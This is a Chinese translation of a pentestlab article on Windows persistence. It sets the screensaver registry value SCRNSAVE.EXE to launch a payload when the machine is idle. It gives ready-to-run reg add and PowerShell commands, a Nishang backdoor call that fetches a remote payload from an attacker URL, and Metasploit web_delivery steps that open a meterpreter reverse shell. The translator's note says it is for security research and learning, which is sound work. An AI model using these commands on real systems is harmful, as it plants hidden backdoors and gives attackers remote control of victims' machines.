# Window权限维持（五）：屏幕保护程序

来源: 03-干货系列\Window权限维持整理\Window权限维持（五）：屏幕保护程序.pdf

屏幕保护是Windows功能的一部分，使用户可以在一段时间不活动后放置屏幕消息或图形动画。众所
周知，Windows的此功能被威胁参与者滥用为持久性方法。这是因为屏幕保护程序是具有.scr文件扩展
名的可执行文件，并通过scrnsave.scr实用程序执行。
屏幕保护程序设置存储在注册表中，从令人反感的角度来看，最有价值的值是：
屏幕保护程序–注册表项
可以通过命令提示符或从PowerShell控制台修改或添加注册表项。由于.scr文件本质上是可执行文件，
因此两个扩展名都可以用于后门植入。
HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d c:\tmp\pentestlab.exe
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d c:\tmp\pentestlab.scr
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -
Value 'c:\tmp\pentestlab.exe'
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -
Value 'c:\tmp\pentestlab.scr'

添加注册表项– CMD和PowerShell
一旦机器不活动时间段过去，将执行任意有效载荷，并且将再次建立命令和控制的通信。
屏幕保护程序– Meterpreter
Nishang框架包含一个PowerShell脚本，该脚本也可以执行此攻击，但与上述方法相比，它需要管理
级别的特权，因为它在本地计算机中使用注册表项来存储将执行远程托管有效负载的PowerShell命
令。这种技术的好处是它不会接触磁盘。
Import-Module .\Add-ScrnSaveBackdoor.ps1
Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.145:8080/Bebr7aOemwFJO

Nishang –屏幕保护程序后门
在这种情况下，可以使用Metasploit Web交付模块生成并托管PowerShell负载。一旦用户会话变为空
闲，屏幕保护程序将执行PowerShell负载，然后将打开一个meterpreter会话。
Meterpreter –屏幕保护程序
use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp
set LHOST IP_Address
set target 2
exploit

利用屏幕保护程序的持久性技术的问题在于，当用户返回并且系统未处于空闲模式时，会话将中断。但
是，红队可以在用户不在时执行其操作。如果屏幕保护程序被组策略禁用，则该技术不能用于持久性。
 
译文声明：本文由Bypass整理并翻译，仅用于安全研究和学习之用。 原文地址：https://pentestl
ab.blog/2019/10/09/persistence-screensaver/
